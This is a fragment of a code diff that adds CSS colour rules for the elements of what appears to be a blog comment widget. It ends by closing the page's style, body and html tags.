+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
